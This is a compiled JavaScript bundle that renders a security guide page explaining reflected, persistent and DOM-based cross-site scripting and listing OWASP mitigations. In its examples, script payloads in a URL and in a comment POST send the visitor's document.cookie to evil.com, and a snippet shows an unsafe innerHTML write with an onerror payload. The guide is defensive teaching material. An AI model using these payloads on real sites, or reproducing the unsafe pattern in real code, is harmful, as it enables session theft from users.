(window.webpackJsonp=window.webpackJsonp||[]).push([[26],{"D/gk":function(e,t,a){e.exports=a.p+"static/pxss-2c765ca8f06ad783d20681e8219af615.png"},GXq7:function(e,t,a){"use strict";a.r(t),a.d(t,"_frontmatter",(function(){return n})),a.d(t,"default",(function(){return l}));a("5hJT"),a("W1QL"),a("K/PF"),a("t91x"),a("75LO"),a("PJhk"),a("mXGw");var i=a("/FXl"),s=a("TjRS");a("aD51");function r(){return(r=Object.assign||function(e){for(var t=1;t<arguments.length;t++){var a=arguments[t];for(var i in a)Object.prototype.hasOwnProperty.call(a,i)&&(e[i]=a[i])}return e}).apply(this,arguments)}var n={};void 0!==n&&n&&n===Object(n)&&Object.isExtensible(n)&&!n.hasOwnProperty("__filemeta")&&Object.defineProperty(n,"__filemeta",{configurable:!0,value:{name:"_frontmatter",filename:"src/attacks_explained/xss.mdx"}});var c={_frontmatter:n},o=s.a;function l(e){var t=e.components,s=function(e,t){if(null==e)return{};var a,i,s={},r=Object.keys(e);for(i=0;i<r.length;i++)a=r[i],t.indexOf(a)>=0||(s[a]=e[a]);return s}(e,["components"]);return Object(i.b)(o,r({},c,s,{components:t,mdxType:"MDXLayout"}),Object(i.b)("h1",{id:"cross-site-scripting-xss"},"Cross-site scripting (XSS)"),Object(i.b)("h2",{id:"the-attack"},"The Attack"),Object(i.b)("iframe",{width:"100%",height:"450",src:"https://www.youtube.com/embed/L5l9lSnNMxg"}),Object(i.b)("h2",{id:"reflected-xss"},"Reflected XSS"),Object(i.b)("p",null,Object(i.b)("img",{alt:"Reflected XSS sample workflow",src:a("P6pS")}),"\n",Object(i.b)("em",{parentName:"p"},"Image from ",Object(i.b)("a",r({parentName:"em"},{href:"https://medium.com/iocscan/reflected-cross-site-scripting-r-xss-b06c3e8d638a"}),"Christopher Makarem"))),Object(i.b)("h3",{id:"keys"},"Keys"),Object(i.b)("ul",null,Object(i.b)("li",{parentName:"ul"},"The Attack is focused on the user input like crafted urls with mailicious payload.")),Object(i.b)("h3",{id:"example"},"Example"),Object(i.b)("p",null,"It is very simple to add a malicious payload in a vulnerable website link."),Object(i.b)("pre",null,Object(i.b)("code",r({parentName:"pre"},{}),"http://website.com/search?keyword=<script>window.location='http://evil.com/?c='+document.cookie<\/script>\n")),Object(i.b)("p",null,"The victim will open this link and will be redirected to a malicious site with the cookie content in the URL."),Object(i.b)("p",null,"Inside the malicious code we can add extra payloads like (ajax calls... )"),Object(i.b)("h2",{id:"persistent-xss"},"persistent XSS"),Object(i.b)("p",null,Object(i.b)("img",{alt:"p-XSS sample workflow",src:a("D/gk")}),"\n",Object(i.b)("em",{parentName:"p"},"Image from ",Object(i.b)("a",r({parentName:"em"},{href:"https://medium.com/iocscan/persistent-cross-site-scripting-p-xss-557c70377554"}),"Christopher Makarem"))),Object(i.b)("h3",{id:"keys-1"},"Keys"),Object(i.b)("p",null,"Also known as stored XSS. The malicious script comes from the website's database, so this attack require few steps to succeed."),Object(i.b)("ul",null,Object(i.b)("li",{parentName:"ul"},"In the first step the attacker will add a malicious payload to the server (so it will be stored)."),Object(i.b)("li",{parentName:"ul"},"Later on the victims will access to the site and the malicious payload will be downloaded together with the legitimate content.")),Object(i.b)("p",null,"This attack can lead to Cookie theft, KeyLogging, Phishing..."),Object(i.b)("h3",{id:"example-1"},"Example"),Object(i.b)("p",null,"The attacker add a malicious payload in the comments section of the site."),Object(i.b)("pre",null,Object(i.b)("code",r({parentName:"pre"},{}),'POST "http://website.com/blog/post-1/comment", body{"<script>window.location=\'http://evil.com/?c=\'+document.cookie<\/script>}\n')),Object(i.b)("p",null,"So any user that visits the website will be vulnerable once this malicious comment is loaded."),Object(i.b)("h2",{id:"dom-xss"},"DOM XSS"),Object(i.b)("p",null,Object(i.b)("img",{alt:"DOM-XSS sample workflow",src:a("xrFw")}),"\n",Object(i.b)("em",{parentName:"p"},"Image from ",Object(i.b)("a",r({parentName:"em"},{href:"https://medium.com/iocscan/dom-based-cross-site-scripting-dom-xss-3396453364fd"}),"Christopher Makarem"))),Object(i.b)("h3",{id:"keys-2"},"Keys"),Object(i.b)("p",null,"If the attacker control any input field value, they can easily add malicious values:"),Object(i.b)("pre",null,Object(i.b)("code",r({parentName:"pre"},{className:"language-js"}),"const search = document.getElementById('search').value;\ndocument.getElementById('results').innerHTML = `You searched for: ${search}`;\n")),Object(i.b)("pre",null,Object(i.b)("code",r({parentName:"pre"},{}),"You searched for: <img src=error onerror='/* Evil payload */'>\n")),Object(i.b)("h3",{id:"notable-incidents"},"Notable incidents"),Object(i.b)("ul",null,Object(i.b)("li",{parentName:"ul"},Object(i.b)("a",r({parentName:"li"},{href:"https://www.telegraph.co.uk/technology/twitter/10894635/BBC-and-White-House-accounts-in-TweetDeck-hack.html"}),"The Telegraph | TweetDeck hack hits BBC and White House accounts")),Object(i.b)("li",{parentName:"ul"},Object(i.b)("a",r({parentName:"li"},{href:"https://www.vice.com/en_us/article/wnjwb4/the-myspace-worm-that-changed-the-internet-forever"}),"VICE | The MySpace Worm that Changed the Internet Forever"))),Object(i.b)("h2",{id:"the-solution"},"The solution"),Object(i.b)("p",null,"There are no definitive solutions to avoid this attack but can be highly mitigated."),Object(i.b)("h2",{id:"mitigation"},"Mitigation"),Object(i.b)("h3",{id:"keys-from-owasp-cheat-sheets-for-xss"},Object(i.b)("a",r({parentName:"h3"},{href:"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"}),"Keys from OWASP Cheat sheets for XSS")),Object(i.b)("ul",null,Object(i.b)("li",{parentName:"ul"},"0 - Never Insert Untrusted Data Except in Allowed Locations"),Object(i.b)("li",{parentName:"ul"},"1 - HTML Escape Before Inserting Untrusted Data into HTML Element Content"),Object(i.b)("li",{parentName:"ul"},"2 - Attribute Escape Before Inserting Untrusted Data into HTML Common Attributes"),Object(i.b)("li",{parentName:"ul"},"3 - JavaScript Escape Before Inserting Untrusted Data into JavaScript Data Values"),Object(i.b)("li",{parentName:"ul"},"3.1 - HTML escape JSON values in an HTML context and read the data with ",Object(i.b)("inlineCode",{parentName:"li"},"JSON.parse")),Object(i.b)("li",{parentName:"ul"},"4 - CSS Escape And Strictly Validate Before Inserting Untrusted Data into HTML Style Property Values"),Object(i.b)("li",{parentName:"ul"},"5 - URL Escape Before Inserting Untrusted Data into HTML URL Parameter Values"),Object(i.b)("li",{parentName:"ul"},"6 - Sanitize HTML Markup with a Library Designed for the Job"),Object(i.b)("li",{parentName:"ul"},"7 - Avoid JavaScript URL's")),Object(i.b)("h3",{id:"keys-from-owasp-cheat-sheets-for-dom-xss"},Object(i.b)("a",r({parentName:"h3"},{href:"https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html"}),"Keys from OWASP Cheat sheets for DOM XSS")),Object(i.b)("ul",null,Object(i.b)("li",{parentName:"ul"},"1 - HTML Escape then JavaScript Escape Before Inserting Untrusted Data into HTML Subcontext within the Execution Context"),Object(i.b)("li",{parentName:"ul"},"2 - JavaScript Escape Before Inserting Untrusted Data into HTML Attribute Subcontext within the Execution Context"),Object(i.b)("li",{parentName:"ul"},"3 - Be Careful when Inserting Untrusted Data into the Event Handler and JavaScript code Subcontexts within an Execution Context"),Object(i.b)("li",{parentName:"ul"},"4 - JavaScript Escape Before Inserting Untrusted Data into the CSS Attribute Subcontext within the Execution Context"),Object(i.b)("li",{parentName:"ul"},"5 - URL Escape then JavaScript Escape Before Inserting Untrusted Data into URL Attribute Subcontext within the Execution Context"),Object(i.b)("li",{parentName:"ul"},"6 - Populate the DOM using safe JavaScript functions or properties"),Object(i.b)("li",{parentName:"ul"},"7 - Fixing DOM Cross-site Scripting Vulnerabilities")),Object(i.b)("h3",{id:"other"},"Other"),Object(i.b)("ul",null,Object(i.b)("li",{parentName:"ul"},"The ",Object(i.b)("a",r({parentName:"li"},{href:"/http_headers/"}),"Recommendations for HTTP Headers in this guide")),Object(i.b)("li",{parentName:"ul"},"The ",Object(i.b)("a",r({parentName:"li"},{href:"/best_practices/express"}),"Best practices for Express in this guide")),Object(i.b)("li",{parentName:"ul"},"The ",Object(i.b)("a",r({parentName:"li"},{href:"/best_practices/react"}),"Best practices for React in this guide"))),Object(i.b)("h3",{id:"refs"},"Refs"),Object(i.b)("ul",null,Object(i.b)("li",{parentName:"ul"},Object(i.b)("a",r({parentName:"li"},{href:"https://speakerdeck.com/ckarande/top-overlooked-security-threats-to-node-dot-js-web-applications?slide=24"}),"ckarande | Top Overlooked Security Threats to Node.js Web Applications")),Object(i.b)("li",{parentName:"ul"},Object(i.b)("a",r({parentName:"li"},{href:"http://scottksmith.com/blog/2015/06/22/secure-node-apps-against-owasp-top-10-cross-site-scripting/"}),"Scott Smith | Cross Site Scripting (XSS)")),Object(i.b)("li",{parentName:"ul"},Object(i.b)("a",r({parentName:"li"},{href:"https://portswigger.net/web-security/cross-site-scripting"}),"portswigger | Cross-site scripting")),Object(i.b)("li",{parentName:"ul"},Object(i.b)("a",r({parentName:"li"},{href:"https://medium.com/iocscan/persistent-cross-site-scripting-p-xss-557c70377554"}),"Medium | Persistent Cross Site Scripting (p-XSS)")),Object(i.b)("li",{parentName:"ul"},Object(i.b)("a",r({parentName:"li"},{href:"https://medium.com/iocscan/dom-based-cross-site-scripting-dom-xss-3396453364fd"}),"Medium | DOM-Based Cross Site Scripting (DOM-XSS)")),Object(i.b)("li",{parentName:"ul"},Object(i.b)("a",r({parentName:"li"},{href:"https://medium.com/iocscan/reflected-cross-site-scripting-r-xss-b06c3e8d638a"}),"Medium | Reflected Cross Site Scripting (r-XSS)")),Object(i.b)("li",{parentName:"ul"},Object(i.b)("a",r({parentName:"li"},{href:"https://www.youtube.com/watch?v=L5l9lSnNMxg"}),"Computerphile | Cracking Websites with Cross Site Scripting"))))}void 0!==l&&l&&l===Object(l)&&Object.isExtensible(l)&&!l.hasOwnProperty("__filemeta")&&Object.defineProperty(l,"__filemeta",{configurable:!0,value:{name:"MDXContent",filename:"src/attacks_explained/xss.mdx"}}),l.isMDXComponent=!0},P6pS:function(e,t,a){e.exports=a.p+"static/rxss-d836aaa5447f630867eb0a9256f788d8.png"},xrFw:function(e,t,a){e.exports=a.p+"static/dom_xss-626500311c72c41d42a47f48f5dbfd9e.png"}}]);
//# sourceMappingURL=component---src-attacks-explained-xss-mdx-5f40b52f931d828fbe25.js.map